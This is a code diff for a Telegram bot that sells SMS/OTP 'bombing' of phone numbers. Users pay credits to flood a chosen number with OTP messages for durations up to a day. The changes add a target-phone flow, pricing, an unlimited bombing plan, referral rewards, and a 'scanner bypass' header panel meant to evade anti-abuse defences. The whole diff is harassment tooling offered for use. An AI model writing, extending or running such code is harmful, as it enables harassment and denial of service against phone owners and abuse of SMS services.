     const chatId = msg.chat.id;
     if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');
 
-    const args = msg.text.split(' ');
-    if (args.length < 2) {
-        return bot.sendMessage(chatId, '❌ Usage: /bomb <phone>\nExample: /bomb 9876543210');
+    if (!await db.isJoined(chatId, bot)) {
+        const channels = await db.getChannels();
+        return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
     }
-    const phone = args[1];
-    
-    // Store phone and show duration buttons
-    userStates.set(chatId, { phone: phone });
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: '1 min', callback_data: 'dur_1' }, { text: '2 min', callback_data: 'dur_2' }, { text: '3 min', callback_data: 'dur_3' }],
-            [{ text: '5 min', callback_data: 'dur_5' }, { text: '10 min', callback_data: 'dur_10' }, { text: '30 min', callback_data: 'dur_30' }],
-            [{ text: '60 min', callback_data: 'dur_60' }, { text: '1 Day', callback_data: 'dur_1440' }]
-        ]
-    };
-    bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ Select duration:`, { parse_mode: 'Markdown', reply_markup: keyboard });
+
+    if (bombingStatus.get(chatId)) {
+        return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
+    }
+
+    bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
+    userStates.set(chatId, { state: 'enter_phone' });
 });
 
 // /stop
@@ -2573,13 +2733,13 @@ bot.onText(/\/stop/, async (msg) => {
     const chatId = msg.chat.id;
     if (bombingStatus.get(chatId)) {
         bombingStatus.set(chatId, false);
-        bot.sendMessage(chatId, '🛑 Bombing stopped.');
+        bot.sendMessage(chatId, '⏹️ Bombing stopped.');
     } else {
         bot.sendMessage(chatId, '❌ No active bombing.');
     }
 });
 
-// /verify
+// /verify (payment)
 bot.onText(/\/verify (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const payId = match[1];
@@ -2628,46 +2788,52 @@ bot.on('message', async (msg) => {
         if (text === '📊 STATS') {
             const totalUsers = await db.User.countDocuments();
             const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
-            bot.sendMessage(chatId, `📊 **Bot Stats**\n👥 Total Users: ${totalUsers}\n💥 Total Attacks: ${totalAttacks}`, { parse_mode: 'Markdown' });
+            const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
+            const config = await db.getScannerConfig();
+            const channels = await db.getChannels();
+            bot.sendMessage(chatId, 
+                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${API_CONFIGS.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
+                { parse_mode: 'Markdown' }
+            );
             return;
         }
         if (text === '👥 USERS LIST') {
-            const users = await db.User.find().select('_id username credits total_attacks').limit(50);
-            let list = '📋 **Users (first 50)**\n\n';
+            const users = await db.User.find().select('_id username credits total_attacks').limit(20);
+            let list = '👥 Users (first 20):\n\n';
             users.forEach(u => {
                 list += `🆔 ${u._id} | @${u.username || 'no_username'} | 💰${u.credits} | 💥${u.total_attacks}\n`;
             });
-            bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, list);
             return;
         }
         if (text === '🎟️ GEN CODE') {
             userStates.set(chatId, { state: 'gen_code' });
-            bot.sendMessage(chatId, '✏️ Enter amount:');
+            bot.sendMessage(chatId, '💰 Send amount for the redeem code (max 1000):');
             return;
         }
         if (text === '🚫 BAN USER') {
             userStates.set(chatId, { state: 'ban_user' });
-            bot.sendMessage(chatId, '✏️ Enter user ID:');
+            bot.sendMessage(chatId, '🚫 Send user ID to ban:');
             return;
         }
         if (text === '✅ UNBAN USER') {
             userStates.set(chatId, { state: 'unban_user' });
-            bot.sendMessage(chatId, '✏️ Enter user ID:');
+            bot.sendMessage(chatId, '✅ Send user ID to unban:');
             return;
         }
         if (text === '💰 ADD CREDITS') {
             userStates.set(chatId, { state: 'add_credits' });
-            bot.sendMessage(chatId, '✏️ Format: `user_id credits`');
+            bot.sendMessage(chatId, '💰 Send user ID:');
             return;
         }
         if (text === '➕ ADD PROTECTED') {
             userStates.set(chatId, { state: 'add_protected' });
-            bot.sendMessage(chatId, '✏️ Enter phone number:');
+            bot.sendMessage(chatId, '🛡️ Send 10-digit number to protect:');
             return;
         }
         if (text === '➖ REMOVE PROTECTED') {
             userStates.set(chatId, { state: 'remove_protected' });
-            bot.sendMessage(chatId, '✏️ Enter phone number:');
+            bot.sendMessage(chatId, '❌ Send 10-digit number to unprotect:');
             return;
         }
         if (text === '📋 PROTECTED LIST') {
@@ -2676,60 +2842,112 @@ bot.on('message', async (msg) => {
             return;
         }
         if (text === '📢 BROADCAST') {
-            userStates.set(chatId, { state: 'broadcast' });
-            bot.sendMessage(chatId, '📢 Send your broadcast message (text, photo, video, document, etc.)\nAll users will receive it.');
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: '📝 Text', callback_data: 'broadcast_text' }],
+                    [{ text: '🖼️ Photo', callback_data: 'broadcast_photo' }],
+                    [{ text: '🎥 Video', callback_data: 'broadcast_video' }],
+                    [{ text: '📄 Document', callback_data: 'broadcast_document' }],
+                    [{ text: '🔊 Audio', callback_data: 'broadcast_audio' }],
+                    [{ text: '🏷️ Sticker', callback_data: 'broadcast_sticker' }]
+                ]
+            };
+            bot.sendMessage(chatId, '📢 **Broadcast Options**\n\nChoose broadcast type:', { reply_markup: keyboard });
             return;
         }
         if (text === '📋 ALL USERS') {
-            const users = await db.User.find().select('_id');
-            let csv = 'User ID\n';
-            users.forEach(u => csv += `${u._id}\n`);
-            // Send as file
-            bot.sendMessage(chatId, `Total users: ${users.length}`);
+            const users = await db.User.find().select('_id username credits');
+            let page = 0;
+            const perPage = 15;
+            const totalPages = Math.ceil(users.length / perPage);
+            const sendPage = async (pageNum) => {
+                const start = pageNum * perPage;
+                const end = start + perPage;
+                const chunk = users.slice(start, end);
+                let msg = '👥 **ALL USERS**\n\n';
+                chunk.forEach(u => {
+                    msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
+                });
+                msg += `\nPage ${pageNum+1}/${totalPages}`;
+                const markup = totalPages > 1 ? {
+                    inline_keyboard: [
+                        ...(pageNum > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${pageNum-1}` }] : []),
+                        ...(pageNum < totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${pageNum+1}` }] : [])
+                    ]
+                } : undefined;
+                return bot.sendMessage(chatId, msg, { parse_mode: 'Markdown', reply_markup: markup });
+            };
+            await sendPage(0);
+            // Store for pagination
+            userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
             return;
         }
         if (text === '🔄 UNLIMITED PLAN') {
             userStates.set(chatId, { state: 'unlimited_plan' });
-            bot.sendMessage(chatId, '✏️ Format: `user_id hours`');
+            bot.sendMessage(chatId, '⭐ Send user ID to grant 1-day unlimited bombing plan:');
             return;
         }
         if (text === '📺 CHANNEL MANAGER') {
             const keyboard = {
                 inline_keyboard: [
-                    [{ text: '➕ Add Channel', callback_data: 'admin_add_channel' }],
-                    [{ text: '➖ Remove Channel', callback_data: 'admin_remove_channel' }],
-                    [{ text: '📋 List Channels', callback_data: 'admin_list_channels' }],
+                    [{ text: '➕ Add Channel', callback_data: 'channel_add' }],
+                    [{ text: '➖ Remove Channel', callback_data: 'channel_remove' }],
+                    [{ text: '📋 View Channels', callback_data: 'channel_view' }],
                     [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                 ]
             };
-            bot.sendMessage(chatId, '📺 **Channel Manager**', { reply_markup: keyboard });
+            bot.sendMessage(chatId, '📺 **Channel Manager**\n\nManage required channels for referral/bot usage.', { reply_markup: keyboard });
             return;
         }
         if (text === '🛡️ SCANNER MANAGER') {
-            bot.sendMessage(chatId, '🛡️ Scanner Manager - Use /addscanner, /removescanner, /listscanners');
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: '➕ Add Scanner', callback_data: 'scanner_add' }],
+                    [{ text: '➖ Remove Scanner', callback_data: 'scanner_remove' }],
+                    [{ text: '📋 View Scanners', callback_data: 'scanner_view' }],
+                    [{ text: '🔄 Set Global Headers', callback_data: 'scanner_headers' }],
+                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
+                ]
+            };
+            bot.sendMessage(chatId, '🛡️ **Scanner Manager**\n\nManage scanner bypass configurations.', { reply_markup: keyboard });
             return;
         }
     }
 
     // Main menu buttons
-    if (text === '🟢 START BOMB' || text.startsWith('🟢 START BOMB')) {
-        userStates.set(chatId, { state: 'enter_phone' });
-        bot.sendMessage(chatId, '📱 Enter phone number (e.g., 9876543210):');
-        return;
-    }
-
     if (text === '🔴 STOP BOMB') {
         if (bombingStatus.get(chatId)) {
             bombingStatus.set(chatId, false);
-            bot.sendMessage(chatId, '🛑 Bombing stopped.');
+            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
         } else {
             bot.sendMessage(chatId, '❌ No active bombing.');
         }
         return;
     }
 
+    if (text.startsWith('🟢 START BOMB') || text.startsWith('🔵 START BOMB') || 
+        text.startsWith('🟡 START BOMB') || text.startsWith('🔴 START BOMB') ||
+        text.startsWith('🟣 START BOMB') || text.startsWith('🟠 START BOMB') ||
+        text.startsWith('🟤 START BOMB')) {
+        if (bombingStatus.get(chatId)) {
+            return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
+        }
+        if (!await db.isJoined(chatId, bot)) {
+            const channels = await db.getChannels();
+            return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
+        }
+        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
+        userStates.set(chatId, { state: 'enter_phone' });
+        return;
+    }
+
     if (text === '💰 MY CREDITS') {
-        bot.sendMessage(chatId, `💳 Your credits: ${user.credits}`);
+        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
+        const unlimitedText = isUnlimited ? '\n⭐ **Unlimited Plan Active!**' : '';
+        bot.sendMessage(chatId, 
+            `💰 **Your Credits:** \`${user.credits}\`${unlimitedText}\n⚔️ **Total Attacks:** ${user.total_attacks || 0}\n\n💡 Each minute costs 1 credit (max 10)\n⭐ 1 Day Unlimited: 20 credits`,
+            { parse_mode: 'Markdown' }
+        );
         return;
     }
 
@@ -2737,19 +2955,27 @@ bot.on('message', async (msg) => {
         const now = Date.now() / 1000;
         if (user.last_daily && user.last_daily > now - 86400) {
             const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
-            return bot.sendMessage(chatId, `⏳ Try again in ${remaining} minutes.`);
+            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
         }
-        const reward = Math.floor(Math.random() * 6) + 1;
+        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
+        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
+        for (const spin of spins) {
+            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
+            await new Promise(r => setTimeout(r, 300));
+        }
+        const reward = Math.floor(Math.random() * 10) + 1;
         await db.updateCredits(chatId, reward);
         user.last_daily = now;
         await user.save();
-        bot.sendMessage(chatId, `🎉 You got ${reward} credits!`);
+        const newBalance = (await db.getUser(chatId)).credits;
+        await bot.editMessageText(`🎉 **You won ${reward} credits!**\n💰 New balance: ${newBalance}`, 
+            { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'Markdown' });
         return;
     }
 
     if (text === '🎟️ REDEEM CODE') {
         userStates.set(chatId, { state: 'redeem_code' });
-        bot.sendMessage(chatId, '✏️ Enter redeem code:');
+        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
         return;
     }
 
@@ -2768,9 +2994,16 @@ bot.on('message', async (msg) => {
     }
 
     if (text === '🔗 REFERRAL') {
+        if (!await db.isJoined(chatId, bot)) {
+            const channels = await db.getChannels();
+            return bot.sendMessage(chatId, `🚫 Join required channels first to use referral:\n${channels.join('\n')}`);
+        }
         const code = await db.generateReferralCode(chatId);
         const botInfo = await bot.getMe();
-        bot.sendMessage(chatId, `🔗 Your code: \`${code}\`\nShare: \`https://t.me/${botInfo.username}?start=${code}\`\n5 credits per referral!`, { parse_mode: 'Markdown' });
+        const refData = await db.getReferralData(chatId);
+        const count = refData.count || 0;
+        const msg = `🔗 **Your Referral Code**\n\n🎯 \`${code}\`\n\n📊 You have referred: ${count} users\n💰 You earned: ${count * 5} credits\n\n**How it works:**\n• Share your code with friends\n• When they join, both get 5 credits!\n• **Note:** Only 1 referral per minute (anti-spam)\n• Invite link: \`https://t.me/${botInfo.username}?start=${code}\``;
+        bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
         return;
     }
 
@@ -2778,17 +3011,32 @@ bot.on('message', async (msg) => {
         const sessions = user.bomb_sessions || [];
         const totalSessions = sessions.length;
         const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
-        bot.sendMessage(chatId, `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n💥 Total Attacks: ${user.total_attacks}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}`, { parse_mode: 'Markdown' });
+        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
+        bot.sendMessage(chatId, 
+            `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}`,
+            { parse_mode: 'Markdown' }
+        );
         return;
     }
 
     if (text === '❓ HELP') {
-        bot.sendMessage(chatId, `📖 **Commands**\n\n/bomb <phone> – Start bombing\n/stop – Stop bombing\n/credits – Check balance\n/daily – Daily spin\n/redeem <code> – Redeem code\n/buy – Buy credits\n/stats – Your stats`);
+        bot.sendMessage(chatId, 
+            `🤖 **BOT COMMANDS & HELP**\n\n📱 **/bomb** - Start bombing (choose duration)\n⏹️ **/stop** - Stop active bombing\n💰 **/credits** - Check your credits\n🎁 **/daily** - Daily spin wheel\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Get referral link\n💳 **/buy** - Buy credits\n⚙️ **/settings** - Modify scanner/headers\n📊 **/stats** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• 1 Day Unlimited: 20 credits\n\n⭐ **Referral Bonus:** 5 credits each!\n⚠️ **Anti-Spam:** Only 1 referral per minute`,
+            { parse_mode: 'Markdown' }
+        );
         return;
     }
 
     if (text === '⚙️ SETTINGS') {
-        bot.sendMessage(chatId, '⚙️ Settings coming soon.');
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '📋 View Settings', callback_data: 'settings_view' }],
+                [{ text: '🔍 Add Scanner', callback_data: 'settings_add_scanner' }],
+                [{ text: '📝 Modify Headers', callback_data: 'settings_modify_headers' }]
+            ]
+        };
+        bot.sendMessage(chatId, '⚙️ **Settings Panel**\n\nHere you can manage scanner bypass and header modifications.', 
+            { parse_mode: 'Markdown', reply_markup: keyboard });
         return;
     }
 
@@ -2799,25 +3047,53 @@ bot.on('message', async (msg) => {
 
         // Channel management states
         if (state.state === 'add_channel') {
-            if (!input.startsWith('@')) return bot.sendMessage(chatId, '❌ Channel must start with @');
+            if (!input.startsWith('@')) input = '@' + input;
             await db.addChannel(input);
-            bot.sendMessage(chatId, `✅ Channel ${input} added.`);
+            bot.sendMessage(chatId, `✅ Channel ${input} added successfully!`);
             userStates.delete(chatId);
             return;
         }
         if (state.state === 'remove_channel') {
+            if (!input.startsWith('@')) input = '@' + input;
             await db.removeChannel(input);
-            bot.sendMessage(chatId, `✅ Channel ${input} removed.`);
+            bot.sendMessage(chatId, `✅ Channel ${input} removed successfully!`);
             userStates.delete(chatId);
             return;
         }
 
+        // Scanner states
+        if (state.state === 'add_scanner') {
+            await db.addScanner(input);
+            bot.sendMessage(chatId, '✅ Scanner added successfully!');
+            userStates.delete(chatId);
+            return;
+        }
+        if (state.state === 'remove_scanner') {
+            const idx = parseInt(input) - 1;
+            const success = await db.removeScanner(idx);
+            bot.sendMessage(chatId, success ? '✅ Scanner removed successfully!' : '❌ Invalid scanner number.');
+            userStates.delete(chatId);
+            return;
+        }
+        if (state.state === 'set_global_headers') {
+            try {
+                const headers = JSON.parse(input);
+                await db.updateGlobalHeaders(headers);
+                bot.sendMessage(chatId, `✅ Global headers updated!\n${JSON.stringify(headers, null, 2)}`);
+            } catch (e) {
+                bot.sendMessage(chatId, '❌ Invalid JSON format.');
+            }
+            userStates.delete(chatId);
+            return;
+        }
+
+        // Admin states
         if (state.state === 'gen_code') {
             const amount = parseInt(input);
-            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
-            const code = Math.random().toString(36).substring(2, 10).toUpperCase();
+            if (isNaN(amount) || amount <= 0 || amount > 1000) return bot.sendMessage(chatId, '❌ Invalid amount. Max 1000.');
+            const code = 'RTF' + Math.random().toString(36).substring(2, 7).toUpperCase();
             await db.createRedeemCode(code, amount);
-            bot.sendMessage(chatId, `✅ Code: \`${code}\` (${amount} credits)`);
+            bot.sendMessage(chatId, `✅ Code: \`${code}\`\nAmount: ${amount} credits`, { parse_mode: 'Markdown' });
             userStates.delete(chatId);
             return;
         }
@@ -2826,7 +3102,7 @@ bot.on('message', async (msg) => {
             const id = parseInt(input);
             if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
             await db.banUser(id);
-            bot.sendMessage(chatId, `✅ User ${id} banned.`);
+            bot.sendMessage(chatId, `✅ Banned ${id}`);
             userStates.delete(chatId);
             return;
         }
@@ -2835,96 +3111,61 @@ bot.on('message', async (msg) => {
             const id = parseInt(input);
             if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
             await db.unbanUser(id);
-            bot.sendMessage(chatId, `✅ User ${id} unbanned.`);
+            bot.sendMessage(chatId, `✅ Unbanned ${id}`);
             userStates.delete(chatId);
             return;
         }
 
         if (state.state === 'add_credits') {
-            const parts = input.split(' ');
-            if (parts.length !== 2) return bot.sendMessage(chatId, '❌ Format: user_id credits');
-            const uid = parseInt(parts[0]);
-            const amt = parseInt(parts[1]);
-            if (isNaN(uid) || isNaN(amt)) return bot.sendMessage(chatId, '❌ Invalid.');
-            await db.updateCredits(uid, amt);
-            bot.sendMessage(chatId, `✅ Added ${amt} credits to user ${uid}.`);
+            const uid = parseInt(input);
+            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
+            userStates.set(chatId, { state: 'add_credits_amount', uid });
+            bot.sendMessage(chatId, '💰 Send amount to add:');
+            return;
+        }
+        if (state.state === 'add_credits_amount') {
+            const amount = parseInt(input);
+            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
+            await db.updateCredits(state.uid, amount);
+            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
             userStates.delete(chatId);
             return;
         }
 
         if (state.state === 'add_protected') {
+            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
             await db.addProtected(input);
-            bot.sendMessage(chatId, `✅ ${input} added to protected.`);
+            bot.sendMessage(chatId, `✅ ${input} added to protected list.`);
             userStates.delete(chatId);
             return;
         }
 
         if (state.state === 'remove_protected') {
+            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
             await db.removeProtected(input);
-            bot.sendMessage(chatId, `✅ ${input} removed from protected.`);
-            userStates.delete(chatId);
-            return;
-        }
-
-        if (state.state === 'broadcast') {
-            // Broadcast with media support
-            const allUsers = await db.User.find().select('_id');
-            let success = 0, fail = 0;
-            const mediaType = msg.photo ? 'photo' :
-                            msg.video ? 'video' :
-                            msg.audio ? 'audio' :
-                            msg.document ? 'document' :
-                            msg.animation ? 'animation' :
-                            msg.sticker ? 'sticker' : 'text';
-            const caption = msg.caption || '';
-
-            for (const u of allUsers) {
-                try {
-                    if (mediaType === 'text') {
-                        await bot.sendMessage(u._id, `📢 **Broadcast:**\n\n${text}`);
-                    } else if (mediaType === 'photo') {
-                        const photo = msg.photo[msg.photo.length - 1].file_id;
-                        await bot.sendPhoto(u._id, photo, { caption: `📢 **Broadcast:**\n\n${caption}` });
-                    } else if (mediaType === 'video') {
-                        await bot.sendVideo(u._id, msg.video.file_id, { caption: `📢 **Broadcast:**\n\n${caption}` });
-                    } else if (mediaType === 'audio') {
-                        await bot.sendAudio(u._id, msg.audio.file_id, { caption: `📢 **Broadcast:**\n\n${caption}` });
-                    } else if (mediaType === 'document') {
-                        await bot.sendDocument(u._id, msg.document.file_id, { caption: `📢 **Broadcast:**\n\n${caption}` });
-                    } else if (mediaType === 'animation') {
-                        await bot.sendAnimation(u._id, msg.animation.file_id, { caption: `📢 **Broadcast:**\n\n${caption}` });
-                    } else if (mediaType === 'sticker') {
-                        await bot.sendSticker(u._id, msg.sticker.file_id);
-                        await bot.sendMessage(u._id, `📢 **Broadcast:**\n\n${caption}`);
-                    }
-                    success++;
-                    await new Promise(r => setTimeout(r, 50));
-                } catch (e) { fail++; }
-            }
-            bot.sendMessage(chatId, `📢 Broadcast sent to ${success} users (${fail} failed).`);
+            bot.sendMessage(chatId, `✅ ${input} removed from protected list.`);
             userStates.delete(chatId);
             return;
         }
 
         if (state.state === 'unlimited_plan') {
-            const parts = input.split(' ');
-            if (parts.length !== 2) return bot.sendMessage(chatId, '❌ Format: user_id hours');
-            const uid = parseInt(parts[0]);
-            const hours = parseInt(parts[1]);
-            if (isNaN(uid) || isNaN(hours) || hours <= 0) return bot.sendMessage(chatId, '❌ Invalid.');
-            const expiry = Date.now() / 1000 + hours * 3600;
+            const uid = parseInt(input);
+            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
             const target = await db.getUser(uid);
-            target.daily_unlimited = expiry;
+            target.daily_unlimited = Date.now() / 1000 + 86400;
             await target.save();
-            bot.sendMessage(chatId, `✅ Unlimited activated for user ${uid} (${hours}h).`);
+            bot.sendMessage(chatId, `✅ Unlimited plan granted to user ${uid} for 24 hours!`);
+            try {
+                await bot.sendMessage(uid, '⭐ **You\'ve been granted a 1-Day Unlimited Bombing Plan!**\n\nYou can now bomb any number for free for the next 24 hours!\nUse /bomb to start bombing.');
+            } catch (e) {}
             userStates.delete(chatId);
             return;
         }
 
         if (state.state === 'redeem_code') {
-            const amount = await db.getRedeemCode(input);
+            const amount = await db.getRedeemCode(input.toUpperCase());
             if (amount === null) {
-                bot.sendMessage(chatId, '❌ Invalid or used code.');
+                bot.sendMessage(chatId, '❌ Invalid code!');
             } else {
                 await db.updateCredits(chatId, amount);
                 bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`);
@@ -2934,20 +3175,187 @@ bot.on('message', async (msg) => {
         }
 
         if (state.state === 'enter_phone') {
-            // Validate phone
-            const phone = input.replace(/[^0-9]/g, '');
-            if (phone.length < 10) return bot.sendMessage(chatId, '❌ Invalid phone number. Enter at least 10 digits.');
+            const phone = input.replace(/\D/g, '');
+            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
             userStates.set(chatId, { phone: phone });
             const keyboard = {
                 inline_keyboard: [
-                    [{ text: '🟢 1 min', callback_data: 'dur_1' }, { text: '🟢 2 min', callback_data: 'dur_2' }, { text: '🟢 3 min', callback_data: 'dur_3' }],
-                    [{ text: '🟢 5 min', callback_data: 'dur_5' }, { text: '🟢 10 min', callback_data: 'dur_10' }, { text: '🟢 30 min', callback_data: 'dur_30' }],
-                    [{ text: '🟢 60 min', callback_data: 'dur_60' }, { text: '🟢 1 Day', callback_data: 'dur_1440' }]
+                    [{ text: '🟢 1 Min (1 coin)', callback_data: 'dur_1' }, { text: '🟢 2 Min (2 coins)', callback_data: 'dur_2' }, { text: '🟢 3 Min (3 coins)', callback_data: 'dur_3' }],
+                    [{ text: '🟢 5 Min (5 coins)', callback_data: 'dur_5' }, { text: '🟢 10 Min (10 coins)', callback_data: 'dur_10' }, { text: '🟢 30 Min (10 coins)', callback_data: 'dur_30' }],
+                    [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (20 coins)', callback_data: 'dur_1440' }]
                 ]
             };
-            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ Select duration:`, { parse_mode: 'Markdown', reply_markup: keyboard });
+            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**`, 
+                { parse_mode: 'Markdown', reply_markup: keyboard });
             return;
         }
+
+        // All users pagination
+        if (state.state === 'allusers') {
+            // Handled via callback
+        }
+    }
+
+    // Admin broadcast handler (any media)
+    if (adminStates.has(chatId)) {
+        const adminState = adminStates.get(chatId);
+        const action = adminState.action;
+
+        if (action === 'broadcast_text') {
+            const users = await db.User.find().select('_id');
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendMessage(u._id, `📢 **BROADCAST**\n\n${text}`);
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+
+        if (action === 'broadcast_photo' && msg.photo) {
+            const users = await db.User.find().select('_id');
+            const photo = msg.photo[msg.photo.length - 1].file_id;
+            const caption = msg.caption || '📢 **BROADCAST**';
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendPhoto(u._id, photo, { caption, parse_mode: 'Markdown' });
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Photo broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+
+        if (action === 'broadcast_video' && msg.video) {
+            const users = await db.User.find().select('_id');
+            const video = msg.video.file_id;
+            const caption = msg.caption || '📢 **BROADCAST**';
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendVideo(u._id, video, { caption, parse_mode: 'Markdown' });
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Video broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+
+        if (action === 'broadcast_document' && msg.document) {
+            const users = await db.User.find().select('_id');
+            const doc = msg.document.file_id;
+            const caption = msg.caption || '📢 **BROADCAST**';
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendDocument(u._id, doc, { caption, parse_mode: 'Markdown' });
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Document broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+
+        if (action === 'broadcast_audio' && msg.audio) {
+            const users = await db.User.find().select('_id');
+            const audio = msg.audio.file_id;
+            const caption = msg.caption || '📢 **BROADCAST**';
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendAudio(u._id, audio, { caption, parse_mode: 'Markdown' });
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Audio broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+
+        if (action === 'broadcast_sticker' && msg.sticker) {
+            const users = await db.User.find().select('_id');
+            const sticker = msg.sticker.file_id;
+            let success = 0, fail = 0;
+            for (const u of users) {
+                try {
+                    await bot.sendSticker(u._id, sticker);
+                    success++;
+                    await new Promise(r => setTimeout(r, 50));
+                } catch (e) { fail++; }
+            }
+            bot.sendMessage(chatId, `✅ Sticker broadcast sent to ${success} users (${fail} failed).`);
+            adminStates.delete(chatId);
+            return;
+        }
+    }
+});
+
+// ---------- SETTINGS CALLBACK ----------
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+
+    if (data === 'settings_view') {
+        const user = await db.getUser(chatId);
+        const msg = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified\n\n${Object.keys(user.custom_headers || {}).length > 0 ? '**Custom Headers:**\n' + Object.entries(user.custom_headers).map(([k, v]) => `\`${k}\`: \`${v}\``).join('\n') : 'No custom headers set.'}`;
+        bot.editMessageText(msg, { chat_id: chatId, message_id: callbackQuery.message.message_id, parse_mode: 'Markdown' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    if (data === 'settings_add_scanner') {
+        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
+            { chat_id: chatId, message_id: callbackQuery.message.message_id });
+        userStates.set(chatId, { state: 'add_scanner_user' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    if (data === 'settings_modify_headers') {
+        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
+            { chat_id: chatId, message_id: callbackQuery.message.message_id });
+        userStates.set(chatId, { state: 'modify_headers', headers: {} });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // All users pagination
